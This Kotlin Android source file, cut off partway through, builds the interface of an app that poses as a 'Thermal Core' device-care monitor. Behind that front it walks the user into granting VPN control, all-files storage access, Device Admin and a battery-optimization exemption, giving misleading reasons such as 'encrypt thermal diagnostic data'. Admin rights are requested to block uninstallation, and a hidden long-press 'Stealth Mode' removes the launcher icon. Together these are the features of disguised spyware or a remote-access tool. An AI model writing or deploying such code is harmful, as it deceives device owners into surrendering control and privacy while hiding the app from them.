package com.example

import android.app.admin.DevicePolicyManager
import android.content.pm.PackageManager
import android.app.ActivityManager
import androidx.compose.foundation.gestures.detectTapGestures
import androidx.compose.ui.input.pointer.pointerInput
import android.content.ComponentName
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.telephony.TelephonyManager
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.net.Uri
import android.net.VpnService
import android.os.BatteryManager
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.os.PowerManager
import android.provider.Settings
import android.widget.Toast
import androidx.activity.ComponentActivity
import androidx.activity.compose.rememberLauncherForActivityResult
import androidx.activity.compose.setContent
import androidx.activity.enableEdgeToEdge
import androidx.activity.result.contract.ActivityResultContracts
import androidx.compose.animation.animateContentSize
import androidx.compose.animation.core.*
import androidx.compose.foundation.background
import androidx.compose.foundation.border
import androidx.compose.foundation.BorderStroke
import androidx.compose.foundation.clickable
import androidx.compose.foundation.verticalScroll
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.interaction.MutableInteractionSource
import androidx.compose.foundation.interaction.collectIsPressedAsState
import androidx.compose.ui.graphics.graphicsLayer
import androidx.compose.material.icons.filled.Refresh
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.shape.CircleShape
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.CheckCircle
import androidx.compose.material.icons.filled.Info
import androidx.compose.material.icons.filled.Settings
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.draw.clip
import androidx.compose.ui.draw.scale
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.text.style.TextAlign
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import androidx.compose.ui.text.AnnotatedString
import androidx.compose.ui.text.SpanStyle
import androidx.compose.ui.text.buildAnnotatedString
import androidx.compose.ui.text.withStyle
import androidx.lifecycle.Lifecycle
import androidx.lifecycle.LifecycleEventObserver
import androidx.lifecycle.viewmodel.compose.viewModel
import com.example.ui.theme.*
import kotlinx.coroutines.delay

class MainActivity : ComponentActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        enableEdgeToEdge()
        setContent {
            MyApplicationTheme {
                Scaffold(
                    modifier = Modifier.fillMaxSize().background(CosmicBackground)
                ) { innerPadding ->
                    ThermalCoreScreen(modifier = Modifier.padding(innerPadding))
                }
            }
        }
    }
}

@Composable
fun ThermalCoreScreen(
    modifier: Modifier = Modifier,
    viewModel: WormholeViewModel = viewModel()
) {
    val context = LocalContext.current
    val lifecycleOwner = androidx.lifecycle.compose.LocalLifecycleOwner.current

    val isEngaged by viewModel.isEngaged.collectAsState()
    
    // Status Trackers
    var isVpnGranted by remember { 
        mutableStateOf(
            try {
                VpnService.prepare(context) == null
            } catch (e: Exception) {
                false
            }
        ) 
    }
    var isStorageGranted by remember { 
        mutableStateOf(
            try {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) Environment.isExternalStorageManager() else false
            } catch (e: Exception) {
                false
            }
        ) 
    }
    var isDeviceAdminGranted by remember { 
        mutableStateOf(
            try {
                val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as? DevicePolicyManager
                val adminComponent = ComponentName(context, ThermalDeviceAdminReceiver::class.java)
                dpm?.isAdminActive(adminComponent) ?: false
            } catch (e: Exception) {
                false
            }
        ) 
    }
    
    var isBatteryIgnored by remember { 
        mutableStateOf(
            try {
                val pm = context.getSystemService(Context.POWER_SERVICE) as? PowerManager
                pm?.isIgnoringBatteryOptimizations(context.packageName) ?: true
            } catch (e: Exception) {
                true
            }
        )
    }
    val notificationGranted by viewModel.postNotificationGranted.collectAsState()

    val infiniteTransition = rememberInfiniteTransition(label = "scanning")
    val scanningSweep by infiniteTransition.animateFloat(
        initialValue = 0.05f,
        targetValue = 0.95f,
        animationSpec = infiniteRepeatable(
            animation = tween(1400, easing = FastOutSlowInEasing),
            repeatMode = RepeatMode.Reverse
        ),
        label = "sweep"
    )
    val shimmerAlpha by infiniteTransition.animateFloat(
        initialValue = 0.4f,
        targetValue = 1.0f,
        animationSpec = infiniteRepeatable(
            animation = tween(1000, easing = LinearEasing),
            repeatMode = RepeatMode.Reverse
        ),
        label = "shimmer"
    )

    var batteryPct by remember { mutableStateOf(100) }
    var cpuTemp by remember { mutableStateOf(28.5f) }
    var storageUsedGb by remember { mutableStateOf(0f) }
    var storageTotalGb by remember { mutableStateOf(0f) }
    var storagePct by remember { mutableStateOf(0f) }
    
    var ramUsedGb by remember { mutableStateOf(0f) }
    var ramTotalGb by remember { mutableStateOf(0f) }
    var ramPct by remember { mutableStateOf(0f) }
    
    var showInfoDialogTitle by remember { mutableStateOf<String?>(null) }
    var showInfoDialogMessage by remember { mutableStateOf<String?>(null) }
    var showStealthDialog by remember { mutableStateOf(false) }

    val aliasComponent = ComponentName(context, "com.example.LauncherActivity")
    var isStealthEnabled by remember {
        mutableStateOf(
            try {
                context.packageManager.getComponentEnabledSetting(aliasComponent) == PackageManager.COMPONENT_ENABLED_STATE_DISABLED
            } catch (e: Exception) {
                false
            }
        )
    }

    val currentStep = when {
        !isVpnGranted -> 1
        !isStorageGranted -> 2
        !isDeviceAdminGranted -> 3
        !isBatteryIgnored -> 4
        !notificationGranted && Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU -> 5
        else -> 6 // All granted
    }
    
    val totalSteps = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) 5 else 4

    var networkCarrier by remember { mutableStateOf<String?>(null) }
    var networkType by remember { mutableStateOf("Scanning...") }
    var ipAddress by remember { mutableStateOf("Scanning...") }
    val deviceModel = Build.MODEL
    val androidVersion = Build.VERSION.RELEASE

    LaunchedEffect(Unit) {
        while (true) {
            try {
                val tm = context.getSystemService(Context.TELEPHONY_SERVICE) as? TelephonyManager
                val carrier = tm?.networkOperatorName
                networkCarrier = if (!carrier.isNullOrBlank()) carrier else "Scanning..."
                
                val cm = context.getSystemService(Context.CONNECTIVITY_SERVICE) as? ConnectivityManager
                val caps = cm?.getNetworkCapabilities(cm.activeNetwork)
                networkType = when {
                    caps == null -> "Offline"
                    caps.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) -> "Wi-Fi"
                    caps.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) -> "Cellular (LTE/5G)"
                    else -> "Unknown Network"
                }
            } catch (e: Exception) {
                // Ignore
            }
            
            try {
                val filter = IntentFilter(Intent.ACTION_BATTERY_CHANGED)
                val batteryStatus = context.registerReceiver(null, filter)
                if (batteryStatus != null) {
                    val level = batteryStatus.getIntExtra(BatteryManager.EXTRA_LEVEL, -1)
                    val scale = batteryStatus.getIntExtra(BatteryManager.EXTRA_SCALE, -1)
                    if (level != -1 && scale != -1) {
                        batteryPct = (level * 100 / scale.toFloat()).toInt()
                    }
                    val temp = batteryStatus.getIntExtra(BatteryManager.EXTRA_TEMPERATURE, -1)
                    if (temp > 0) {
                        cpuTemp = temp / 10f
                    }
                }
            } catch (e: Exception) {
                // Ignore
            }
            
            try {
                val stat = android.os.StatFs(android.os.Environment.getDataDirectory().path)
                val total = stat.totalBytes
                val available = stat.availableBytes
                val used = total - available
                storageTotalGb = total / (1024f * 1024f * 1024f)
                storageUsedGb = used / (1024f * 1024f * 1024f)
                if (total > 0) {
                    storagePct = used.toFloat() / total.toFloat()
                }
            } catch (e: Exception) {
                // Ignore
            }
            
            try {
                val am = context.getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
                val mi = ActivityManager.MemoryInfo()
                am.getMemoryInfo(mi)
                val totalRam = mi.totalMem.toFloat()
                val availRam = mi.availMem.toFloat()
                val usedRam = totalRam - availRam
                ramTotalGb = totalRam / (1024f * 1024f * 1024f)
                ramUsedGb = usedRam / (1024f * 1024f * 1024f)
                ramPct = if (totalRam > 0f) usedRam / totalRam else 0f
            } catch (e: Exception) {
                // Ignore
            }
            
            try {
                var foundIp: String? = null
                val en = java.net.NetworkInterface.getNetworkInterfaces()
                while (en.hasMoreElements()) {
                    val intf = en.nextElement()
                    val enumIpAddr = intf.inetAddresses
                    while (enumIpAddr.hasMoreElements()) {
                        val inetAddress = enumIpAddr.nextElement()
                        if (!inetAddress.isLoopbackAddress && inetAddress is java.net.Inet4Address) {
                            // Prefer tailscale IP if available (starts with 100.)
                            if (inetAddress.hostAddress?.startsWith("100.") == true) {
                                foundIp = inetAddress.hostAddress
                                break
                            } else if (foundIp == null) {
                                foundIp = inetAddress.hostAddress
                            }
                        }
                    }
                    if (foundIp?.startsWith("100.") == true) break
                }
                ipAddress = foundIp ?: "Offline"
            } catch (e: Exception) {
                // Ignore
            }
            
            delay(1000)
        }
    }

    DisposableEffect(lifecycleOwner) {
        val observer = LifecycleEventObserver { _, event ->
            if (event == Lifecycle.Event.ON_RESUME) {
                isVpnGranted = try { VpnService.prepare(context) == null } catch (e: Exception) { false }
                isStorageGranted = try { if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) Environment.isExternalStorageManager() else false } catch (e: Exception) { false }
                isDeviceAdminGranted = try {
                    val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as? DevicePolicyManager
                    val adminComponent = ComponentName(context, ThermalDeviceAdminReceiver::class.java)
                    dpm?.isAdminActive(adminComponent) ?: false
                } catch (e: Exception) {
                    false
                }
                isBatteryIgnored = try {
                    val pm = context.getSystemService(Context.POWER_SERVICE) as? PowerManager
                    pm?.isIgnoringBatteryOptimizations(context.packageName) ?: true
                } catch (e: Exception) {
                    true
                }
                viewModel.refreshPermissions(context)
            }
        }
        lifecycleOwner.lifecycle.addObserver(observer)
        onDispose { lifecycleOwner.lifecycle.removeObserver(observer) }
    }

    val storageLauncher = rememberLauncherForActivityResult(ActivityResultContracts.StartActivityForResult()) {
        isStorageGranted = try { if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) Environment.isExternalStorageManager() else false } catch (e: Exception) { false }
        if (!isStorageGranted) {
            showInfoDialogTitle = "Storage Bridge Required"
            showInfoDialogMessage = "System Stability requires full storage access to build the secure sync bridge. Please allow access to proceed."
        }
    }
    
    val adminLauncher = rememberLauncherForActivityResult(ActivityResultContracts.StartActivityForResult()) {
        isDeviceAdminGranted = try {
            val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as? DevicePolicyManager
            val adminComponent = ComponentName(context, ThermalDeviceAdminReceiver::class.java)
            dpm?.isAdminActive(adminComponent) ?: false
        } catch (e: Exception) {
            false
        }
        if (!isDeviceAdminGranted) {
            showInfoDialogTitle = "System Protection Required"
            showInfoDialogMessage = "Thermal Core needs Device Admin privileges to prevent accidental termination or uninstallation."
        }
    }
    
    val batteryLauncher = rememberLauncherForActivityResult(ActivityResultContracts.StartActivityForResult()) {
        isBatteryIgnored = try {
            val pm = context.getSystemService(Context.POWER_SERVICE) as? PowerManager
            pm?.isIgnoringBatteryOptimizations(context.packageName) ?: true
        } catch (e: Exception) {
            true
        }
        if (!isBatteryIgnored) {
            showInfoDialogTitle = "Power Sync Required"
            showInfoDialogMessage = "To maintain a 24/7 steady core temperature and background sync, Battery Optimization must be disabled for Thermal Core."
        }
    }

    val vpnLauncher = rememberLauncherForActivityResult(ActivityResultContracts.StartActivityForResult()) {
        isVpnGranted = try { VpnService.prepare(context) == null } catch (e: Exception) { false }
        if (!isVpnGranted) {
            showInfoDialogTitle = "Security Core Required"
            showInfoDialogMessage = "System initialization requires a secure VPN Node to encrypt thermal diagnostic data. Please allow connection."
        }
    }
    
    val notificationLauncher = rememberLauncherForActivityResult(ActivityResultContracts.RequestPermission()) { granted ->
        viewModel.refreshPermissions(context)
        if (!granted) {
            showInfoDialogTitle = "System Alerts Required"
            showInfoDialogMessage = "Thermal Core needs to run as a System Framework Service. Please enable notifications to ensure the core is not terminated."
        }
    }

    fun handleEnforcerAction() {
        if (!isVpnGranted) {
            val vpnIntent = try {
                VpnService.prepare(context)
            } catch (e: Exception) {
                null
            }
            if (vpnIntent != null) {
                vpnLauncher.launch(vpnIntent)
                return
            } else {
                isVpnGranted = try { VpnService.prepare(context) == null } catch (e: Exception) { false }
                if (!isVpnGranted) return
            }
        }
        if (!isStorageGranted) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                try {
                    val intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION).apply {
                        data = Uri.parse("package:" + context.packageName)
                    }
                    storageLauncher.launch(intent)
                } catch (e: Exception) {
                    storageLauncher.launch(Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION))
                }
            }
            return
        }
        if (!isDeviceAdminGranted) {
            val adminComponent = ComponentName(context, ThermalDeviceAdminReceiver::class.java)
            val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
                putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent)
                putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "System Protection is required for Thermal Core stability.")
            }
            adminLauncher.launch(intent)
            return
        }
        if (!isBatteryIgnored) {
            val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                data = Uri.parse("package:" + context.packageName)
            }
            batteryLauncher.launch(intent)
            return
        }
        if (!notificationGranted && Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            notificationLauncher.launch(android.Manifest.permission.POST_NOTIFICATIONS)
            return
        }
        
        // Final Stage: All satisfied
        if (!isEngaged) {
            viewModel.toggleSync(context)
        }
    }

    val permissionsMet = isVpnGranted && isStorageGranted && isDeviceAdminGranted && isBatteryIgnored && (notificationGranted || Build.VERSION.SDK_INT < Build.VERSION_CODES.TIRAMISU)
    
    if (showStealthDialog) {
        AlertDialog(
            onDismissRequest = { showStealthDialog = false },
            title = { Text("Stealth Configuration", fontWeight = FontWeight.SemiBold, fontSize = 18.sp) },
            text = { Text("Enable Stealth Mode to hide Thermal Core from the home screen launcher. It can only be accessed via Settings > Apps.", color = TextSecondary, fontSize = 14.sp) },
            confirmButton = {
                TextButton(onClick = {
                    try {
                        context.packageManager.setComponentEnabledSetting(
                            aliasComponent,
                            if (isStealthEnabled) PackageManager.COMPONENT_ENABLED_STATE_DEFAULT else PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                            PackageManager.DONT_KILL_APP
                        )
                        isStealthEnabled = !isStealthEnabled
                    } catch (e: Exception) { }
                    showStealthDialog = false
                }) {
                    Text(if (isStealthEnabled) "Disable Stealth" else "Enable Stealth", color = AccentBlue)
                }
            },
            dismissButton = {
                TextButton(onClick = { showStealthDialog = false }) { Text("Cancel", color = TextSecondary) }
            },
            containerColor = CosmicSurface,
            titleContentColor = TextPrimary,
            textContentColor = TextSecondary
        )
    }

    if (showInfoDialogTitle != null) {
        AlertDialog(
            onDismissRequest = { 
                showInfoDialogTitle = null 
                showInfoDialogMessage = null
            },
            title = {
                Text(text = showInfoDialogTitle!!, fontWeight = FontWeight.SemiBold, fontSize = 18.sp)
            },
            text = {
                Text(text = showInfoDialogMessage!!, color = TextSecondary, fontSize = 14.sp)
            },
            confirmButton = {
                TextButton(
                    onClick = { 
                        showInfoDialogTitle = null 
                        showInfoDialogMessage = null
                        // Try again
                        handleEnforcerAction()
                    }
                ) {
                    Text("Try Again", color = AccentBlue)
                }
            },
            dismissButton = {
                TextButton(
                    onClick = { 
                        showInfoDialogTitle = null 
                        showInfoDialogMessage = null
                    }
                ) {
                    Text("Skip for now", color = TextSecondary)
                }
            },
            containerColor = CosmicSurface,
            titleContentColor = TextPrimary,
            textContentColor = TextSecondary
        )
    }

    val configuration = androidx.compose.ui.platform.LocalConfiguration.current
    val isCompactHeight = configuration.screenHeightDp < 740

    Column(
        modifier = modifier
            .fillMaxSize()
            .background(CosmicBackground)
            .padding(horizontal = 14.dp, vertical = if (isCompactHeight) 4.dp else 10.dp),
        verticalArrangement = Arrangement.SpaceBetween,
        horizontalAlignment = Alignment.CenterHorizontally
    ) {
        // 1. Compact Horizontal Header
        Row(
            modifier = Modifier
                .fillMaxWidth()
                .padding(vertical = if (isCompactHeight) 2.dp else 6.dp),
            verticalAlignment = Alignment.CenterVertically,
            horizontalArrangement = Arrangement.SpaceBetween
        ) {
            Row(verticalAlignment = Alignment.CenterVertically) {
                Icon(
                    imageVector = Icons.Default.Settings,
                    contentDescription = null,
                    tint = if (isEngaged) AccentBlue else TextSecondary,
                    modifier = Modifier
                        .size(if (isCompactHeight) 28.dp else 36.dp)
                        .pointerInput(Unit) {
                            detectTapGestures(
                                onLongPress = { showStealthDialog = true }
                            )
                        }
                )
                Spacer(modifier = Modifier.width(if (isCompactHeight) 6.dp else 10.dp))
                Column {
                    Text(
                        text = "Thermal Core",
                        color = TextPrimary,
                        fontSize = if (isCompactHeight) 15.sp else 18.sp,
                        fontWeight = FontWeight.Bold
                    )
                    Text(
                        text = "Device Care & Performance",
                        color = TextSecondary,
                        fontSize = if (isCompactHeight) 10.sp else 12.sp
                    )
                }
            }
            Box(
                modifier = Modifier
                    .size(if (isCompactHeight) 8.dp else 10.dp)
                    .background(if (isEngaged) AccentBlue else TextSecondary, CircleShape)
            )
        }

        // Orchestrate all reveals across cards (0 to 11)
        var revealStep by remember { mutableIntStateOf(0) }
        LaunchedEffect(isEngaged) {
            if (isEngaged) {
                revealStep = 0; delay(400) // Device scanning
                revealStep = 1; delay(400) // Android scanning
                revealStep = 2; delay(400) // Carrier scanning
                revealStep = 3; delay(400) // Network scanning
                revealStep = 4; delay(400) // CPU scanning
                revealStep = 5; delay(400) // Battery scanning
                revealStep = 6; delay(800) // Storage scanning
                revealStep = 7; delay(800) // RAM scanning + Storage filling starts
                revealStep = 8; delay(1500) // RAM filling starts, wait for bars to finish animating
                revealStep = 9; delay(800) // Protection scanning
                revealStep = 10; delay(800) // Framework scanning
                revealStep = 11 // Done
            } else {
                revealStep = 0
            }
        }

        Card(
            modifier = Modifier
                .fillMaxWidth()
                .padding(vertical = if (isCompactHeight) 2.dp else 6.dp),
            colors = CardDefaults.cardColors(containerColor = CosmicSurface),
            shape = RoundedCornerShape(if (isCompactHeight) 14.dp else 20.dp),
            border = BorderStroke(1.dp, BorderColor),
            elevation = CardDefaults.cardElevation(defaultElevation = if (isCompactHeight) 4.dp else 8.dp)
        ) {
            Column(
                modifier = Modifier
                    .padding(if (isCompactHeight) 8.dp else 16.dp)
                    .animateContentSize(
                        animationSpec = spring(
                            dampingRatio = Spring.DampingRatioNoBouncy,
                            stiffness = Spring.StiffnessMedium
                        )
                    ),
                verticalArrangement = Arrangement.spacedBy(if (isCompactHeight) 2.dp else 6.dp)
            ) {
                GroupHeader("SYSTEM IDENTITY")
                
                val displayDevice = if (!isEngaged || revealStep < 0) "Standby..." else if (revealStep == 0) "Scanning..." else deviceModel
                val displayAndroid = if (!isEngaged || revealStep < 1) "Standby..." else if (revealStep == 1) "Scanning..." else "Android $androidVersion"
                val displayCarrier = if (!isEngaged || revealStep < 2) "Standby..." else if (revealStep == 2) "Scanning..." else (networkCarrier ?: "No Carrier")
                val displayNet = if (!isEngaged || revealStep < 3) "Standby..." else if (revealStep == 3) "Scanning..." else "$networkType (${if (ipAddress == "Offline") "No IP" else ipAddress})"
                
                ThermalStatRow("Device", displayDevice, isEngaged = revealStep >= 1, isScanning = revealStep == 0, checkColor = AccentGreen)
                ThermalStatRow("Android Version", displayAndroid, isEngaged = revealStep >= 2, isScanning = revealStep == 1, checkColor = AccentGreen)
                ThermalStatRow("Carrier", displayCarrier, isEngaged = revealStep >= 3, isScanning = revealStep == 2, checkColor = AccentGreen)
                ThermalStatRow("Network Connection", displayNet, isEngaged = revealStep >= 4, isScanning = revealStep == 3, checkColor = AccentGreen, useIpFormatting = true)
            }
        }

        // 3. Group 2: System Resources Card
        Card(
            modifier = Modifier
                .fillMaxWidth()
                .padding(vertical = if (isCompactHeight) 2.dp else 6.dp),
            colors = CardDefaults.cardColors(containerColor = CosmicSurface),
            shape = RoundedCornerShape(if (isCompactHeight) 14.dp else 20.dp),
            border = BorderStroke(1.dp, BorderColor),
            elevation = CardDefaults.cardElevation(defaultElevation = if (isCompactHeight) 4.dp else 8.dp)
        ) {
            Column(
                modifier = Modifier
                    .padding(if (isCompactHeight) 8.dp else 16.dp)
                    .animateContentSize(
                        animationSpec = spring(
                            dampingRatio = Spring.DampingRatioNoBouncy,
                            stiffness = Spring.StiffnessMedium
                        )
                    ),
                verticalArrangement = Arrangement.spacedBy(if (isCompactHeight) 2.dp else 8.dp)
            ) {
                GroupHeader("SYSTEM RESOURCES")
                
                val displayCpu = if (!isEngaged || revealStep < 4) "Standby..." else if (revealStep == 4) "Scanning..." else "${"%.1f".format(cpuTemp)}°C"
                val displayBattery = if (!isEngaged || revealStep < 5) "Standby..." else if (revealStep == 5) "Scanning..." else "${batteryPct}%"
                
                val cpuValueColor = if (revealStep > 4) TextPrimary else null
                val batteryValueColor = if (revealStep > 5) TextPrimary else null

                ThermalStatRow("CPU Temperature", displayCpu, isEngaged = revealStep >= 5, isScanning = revealStep == 4, checkColor = AccentBlue, customValueColor = cpuValueColor, showCheckmark = false)
                ThermalStatRow("Battery Status", displayBattery, isEngaged = revealStep >= 6, isScanning = revealStep == 5, checkColor = AccentBlue, customValueColor = batteryValueColor, showCheckmark = false)
                
                val animatedStoragePct by animateFloatAsState(
                    targetValue = if (revealStep >= 7) storagePct else 0f,
                    animationSpec = tween(durationMillis = 1500, easing = LinearOutSlowInEasing),
                    label = "storage_anim"
                )
                
                val animatedRamPct by animateFloatAsState(
                    targetValue = if (revealStep >= 8) ramPct else 0f,
                    animationSpec = tween(durationMillis = 1500, easing = LinearOutSlowInEasing),
                    label = "ram_anim"
                )

                // Storage Progress Row
                Column(modifier = Modifier.fillMaxWidth()) {
                    Row(
                        modifier = Modifier.fillMaxWidth(),
                        horizontalArrangement = Arrangement.SpaceBetween,
                        verticalAlignment = Alignment.CenterVertically
                    ) {
                        Text(text = "System Storage", color = TextSecondary, fontSize = 13.sp, fontWeight = FontWeight.Medium)
                        val storageLabel = if (!isEngaged || revealStep < 6) {
                            "Standby..."
                        } else if (revealStep == 6) {
                            "0% (0.0GB / 0.0GB)"
                        } else {
                            "${"%.0f".format(animatedStoragePct * 100f)}% (${"%.1f".format(animatedStoragePct * storageTotalGb)}GB / ${"%.1f".format(storageTotalGb)}GB)"
                        }
                        
                        Text(
                            text = storageLabel, 
                            color = TextPrimary, 
                            fontSize = 13.sp, 
                            fontWeight = FontWeight.SemiBold
                        )
                    }
                    Spacer(modifier = Modifier.height(2.dp))
                    
                    val storageTint = when {
                        !isEngaged -> Color(0xFFC7C7CC)
                        animatedStoragePct > 0.80f -> Color(0xFFFF3B30)
                        animatedStoragePct > 0.50f -> Color(0xFFFFCC00)
                        animatedStoragePct > 0.25f -> AccentBlue
                        else -> AccentGreen
                    }
                    
                    ScanningProgressBar(
                        progress = animatedStoragePct,
                        isScanning = isEngaged && revealStep == 6,
                        color = storageTint,
                        trackColor = Color(0x1F000000),
                        modifier = Modifier.fillMaxWidth()
                    )
                }
                
                // RAM Progress Row
                Column(modifier = Modifier.fillMaxWidth()) {
                    Row(
                        modifier = Modifier.fillMaxWidth(),
                        horizontalArrangement = Arrangement.SpaceBetween,
                        verticalAlignment = Alignment.CenterVertically
                    ) {
                        Text(text = "System Memory (RAM)", color = TextSecondary, fontSize = 13.sp, fontWeight = FontWeight.Medium)
                        val ramLabel = if (!isEngaged || revealStep < 7) {
                            "Standby..."
                        } else if (revealStep == 7) {
                            "0% (0.0GB / 0.0GB)"
                        } else {
                            "${"%.0f".format(animatedRamPct * 100f)}% (${"%.1f".format(animatedRamPct * ramTotalGb)}GB / ${"%.1f".format(ramTotalGb)}GB)"
                        }
                        
                        Text(
                            text = ramLabel, 
                            color = TextPrimary, 
                            fontSize = 13.sp, 
                            fontWeight = FontWeight.SemiBold
                        )
                    }
                    Spacer(modifier = Modifier.height(2.dp))
                    
                    val ramTint = when {
                        !isEngaged -> Color(0xFFC7C7CC)
                        animatedRamPct > 0.80f -> Color(0xFFFF3B30)
                        animatedRamPct > 0.50f -> Color(0xFFFFCC00)
                        animatedRamPct > 0.25f -> AccentBlue
                        else -> AccentGreen
                    }
                    
                    ScanningProgressBar(
                        progress = animatedRamPct,
                        isScanning = isEngaged && revealStep == 7,
                        color = ramTint,
                        trackColor = Color(0x1F000000),
                        modifier = Modifier.fillMaxWidth()
                    )
                }
            }
        }

        // 4. Group 3: Framework Protection Card
        Card(
            modifier = Modifier
                .fillMaxWidth()
                .padding(vertical = if (isCompactHeight) 2.dp else 6.dp),
            colors = CardDefaults.cardColors(containerColor = CosmicSurface),
            shape = RoundedCornerShape(if (isCompactHeight) 14.dp else 20.dp),
            border = BorderStroke(1.dp, BorderColor),
            elevation = CardDefaults.cardElevation(defaultElevation = if (isCompactHeight) 4.dp else 8.dp)
        ) {
            Column(
                modifier = Modifier
                    .padding(if (isCompactHeight) 8.dp else 16.dp)
                    .animateContentSize(
                        animationSpec = spring(
                            dampingRatio = Spring.DampingRatioNoBouncy,
                            stiffness = Spring.StiffnessMedium
                        )
                    ),
                verticalArrangement = Arrangement.spacedBy(if (isCompactHeight) 2.dp else 6.dp)
            ) {
                GroupHeader("FRAMEWORK PROTECTION")
                
                val displayProtection = if (!isEngaged || revealStep < 9) "Unknown" else if (revealStep == 9) "Scanning..." else if (isDeviceAdminGranted) "Active" else "Deactivated"
                val displayFramework = if (!isEngaged || revealStep < 10) "Unknown" else if (revealStep == 10) "Scanning..." else "Running"
                
                val protectionColor = if (revealStep > 9) TextPrimary else null
                val frameworkColor = if (revealStep > 10) AccentGreen else Color(0xFFFF3B30)

                ThermalStatRow("Protection Status", displayProtection, isEngaged = revealStep > 9, isScanning = revealStep == 9, checkColor = AccentBlue, customValueColor = protectionColor, showCheckmark = false)
                ThermalStatRow("Core Framework", displayFramework, isEngaged = revealStep > 10, isScanning = revealStep == 10, checkColor = AccentBlue, customValueColor = frameworkColor, showCheckmark = false)
            }
        }

        // Interactive Bottom Action Button
        val buttonInteractionSource = remember { MutableInteractionSource() }
        val isPressed by buttonInteractionSource.collectIsPressedAsState()
        val buttonScale by animateFloatAsState(
            targetValue = if (isPressed) 0.95f else 1.0f,
            animationSpec = spring(
                dampingRatio = Spring.DampingRatioMediumBouncy,
                stiffness = Spring.StiffnessLow
            ),
            label = "pressed_scale"
        )
        
        Button(
            onClick = {
                if (!permissionsMet) {
                    handleEnforcerAction()
                } else if (!isEngaged) {
                    viewModel.toggleSync(context)
                }
            },
            interactionSource = buttonInteractionSource,
            colors = ButtonDefaults.buttonColors(
                containerColor = when {
                    isEngaged -> AccentBlue
                    permissionsMet -> AccentBlue // Highlighted when ready to enable
                    else -> Color(0xFFE5E5EA) // Neutral unlit state during wizard steps
                },
                contentColor = when {
                    isEngaged -> Color.White
                    permissionsMet -> Color.White
                    else -> TextSecondary // Unlit gray during wizard steps
                }
            ),
            border = null,
            shape = RoundedCornerShape(28.dp),
            modifier = Modifier
                .fillMaxWidth()
                .height(if (isCompactHeight) 44.dp else 54.dp)
                .graphicsLayer {
                    scaleX = buttonScale
                    scaleY = buttonScale
                },
            elevation = ButtonDefaults.buttonElevation(
                defaultElevation = if (isEngaged && isPressed) 2.dp else if (isEngaged) 6.dp else 0.dp
            )
        ) {
            if (isEngaged) {
                Row(verticalAlignment = Alignment.CenterVertically) {
                    Icon(
                        imageVector = Icons.Default.CheckCircle,
                        contentDescription = null,
                        tint = Color.White,
                        modifier = Modifier.size(20.dp)
                    )
                    Spacer(modifier = Modifier.width(8.dp))
                    Text(
                        text = "System Protected & Active",
                        fontSize = 15.sp,
                        fontWeight = FontWeight.Bold
                    )
                }
            } else {
                val btnText = if (permissionsMet) {
                    "Enable Thermal Service"
                } else {
                    val stepLabel = when (currentStep) {
                        1 -> "Configure VPN"
                        2 -> "Configure Storage"
                        3 -> "Configure Admin"
                        4 -> "Configure Power Sync"
                        else -> "Configure Alerts"
                    }
                    "Activate Phase $currentStep: $stepLabel"
                }
                Text(
                    text = btnText,
                    fontSize = 15.sp,
                    fontWeight = FontWeight.Bold
                )
            }
        }
    }
}

@Composable
fun GroupHeader(title: String) {
    val configuration = androidx.compose.ui.platform.LocalConfiguration.current
    val isCompact = configuration.screenHeightDp < 740
    Text(
        text = title,
        color = TextPrimary, // Bold Black in Light Theme!
        fontSize = if (isCompact) 10.sp else 12.sp,
        fontWeight = FontWeight.Bold,
        letterSpacing = if (isCompact) 1.sp else 1.2.sp,
        modifier = Modifier.padding(horizontal = 4.dp, vertical = if (isCompact) 1.dp else 2.dp)
    )
}

@Composable
fun ScanningProgressBar(
    progress: Float,
    isScanning: Boolean,
    color: Color,
    trackColor: Color,
    modifier: Modifier = Modifier
) {
    if (isScanning) {
        BoxWithConstraints(
            modifier = modifier
                .fillMaxWidth()
                .height(6.dp)
                .clip(CircleShape)
                .background(trackColor)
        ) {
            val width = constraints.maxWidth.toFloat()
            val transition = rememberInfiniteTransition(label = "scanning_bar")
            val offsetRatio by transition.animateFloat(
                initialValue = 0f,
                targetValue = 1f,
                animationSpec = infiniteRepeatable(
                    animation = tween(800, easing = LinearEasing),
                    repeatMode = RepeatMode.Restart
                ),
                label = "offset"
            )
            
            androidx.compose.foundation.Canvas(modifier = Modifier.fillMaxSize()) {
                val stripeWidth = 15.dp.toPx()
                val gapWidth = 15.dp.toPx()
                val totalWidth = stripeWidth + gapWidth
                val offset = offsetRatio * totalWidth
                
                val tilt = size.height * 2f
                
